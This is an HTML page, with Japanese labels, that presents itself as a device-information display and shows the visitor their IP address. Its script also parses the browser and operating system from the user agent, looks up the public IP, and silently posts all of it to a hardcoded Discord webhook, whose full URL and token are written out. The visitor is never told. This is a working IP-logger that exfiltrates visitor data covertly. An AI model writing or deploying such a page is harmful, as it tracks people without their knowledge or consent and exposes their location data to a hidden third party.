<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>端末情報表示</title>
<style>
    .device-info {
        font-family: Arial, sans-serif;
        padding: 20px;
        background-color: #f4f4f4;
        border-radius: 5px;
        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
    }
    .info-label {
        font-weight: bold;
    }
</style>
</head>
<body>

<h2>端末情報</h2>

<div class="device-info">
    <p><span class="info-label">IPアドレス:</span> <span id="ipAddress"></span></p>
</div>

<script>
    var userAgent = navigator.userAgent;
    var browser = "Unknown";
    var browserVersion = "Unknown";
    var os = "Unknown";
    var osVersion = "Unknown";

    // ブラウザとバージョン
    if (userAgent.indexOf("Firefox") > -1) {
        browser = "Firefox";
        browserVersion = userAgent.split("Firefox/")[1];
    } else if (userAgent.indexOf("Chrome") > -1) {
        browser = "Chrome";
        browserVersion = userAgent.split("Chrome/")[1].split(" ")[0];
    } else if (userAgent.indexOf("Safari") > -1) {
        browser = "Safari";
        browserVersion = userAgent.split("Version/")[1].split(" ")[0];
    } else if (userAgent.indexOf("MSIE") > -1 || userAgent.indexOf("Trident/") > -1) {
        browser = "Internet Explorer";
        browserVersion = userAgent.split("MSIE ")[1].split(";")[0];
    }

    // OSとバージョン
    if (userAgent.indexOf("Windows") > -1) {
        os = "Windows";
        osVersion = userAgent.split("Windows NT ")[1].split(";")[0];
    } else if (userAgent.indexOf("Macintosh") > -1) {
        os = "Macintosh";
        osVersion = "OS X " + userAgent.split("OS X ")[1].split(")")[0];
    } else if (userAgent.indexOf("Android") > -1) {
        os = "Android";
        osVersion = userAgent.split("Android ")[1].split(";")[0];
    } else if (userAgent.indexOf("iPhone") > -1 || userAgent.indexOf("iPad") > -1) {
        os = "iOS";
        osVersion = userAgent.split("OS ")[1].split(" ")[0];
    }

    // IPアドレス取得
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            document.getElementById("ipAddress").textContent = data.ip;
            sendDataToDiscord(data.ip, browser, browserVersion, os, osVersion);
        })
        .catch(error => {
            console.error('IPアドレスの取得に失敗しました:', error);
            document.getElementById("ipAddress").textContent = "IPアドレスを取得できません";
        });

    // DiscordのWebhookにデータを送信する関数
    function sendDataToDiscord(ipAddress, browser, browserVersion, os, osVersion) {
        var webhookURL = 'https://discord.com/api/webhooks/1223447142740262972/vxrn9O3gB3fVm0mx0g_VcN4jYB0MRK-L6pdcinnad2gTAk3jFYbYg_S1vfPixzFLoK6G'; // ここにDiscordのWebhookのURLを入力してください
        var data = {
            content: '```端末情報:\nブラウザ: ' + browser + '\nブラウザバージョン: ' + browserVersion + '\nOS: ' + os + '\nOSバージョン: ' + osVersion + '\nIPアドレス: ' + ipAddress + '```'
        };

        fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data),
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Failed to send data to Discord');
            }
            console.log('Data sent to Discord successfully');
        })
        .catch(error => {
            console.error('Error sending data to Discord:', error);
        });
    }
</script>

</body>
</html>
